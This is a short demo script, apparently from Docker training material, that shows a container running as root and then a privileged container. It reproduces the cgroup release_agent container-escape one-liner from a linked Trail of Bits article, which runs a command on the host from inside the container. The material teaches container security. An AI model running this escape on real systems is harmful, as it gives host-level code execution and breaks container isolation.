## Example 5 - Root user 
Demonstrate root user  

# Script to follow
Demonstrate root user

```
docker build --no-cache -t scratchtest .
docker run -it --entrypoint "/bin/bash" scratchtest
whoami
docker run -it --privileged --entrypoint "/bin/bash" scratchtest
```

[understanding-docker-container-escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)  
```
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\nps -aux >'"$t/o" >/c;
chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```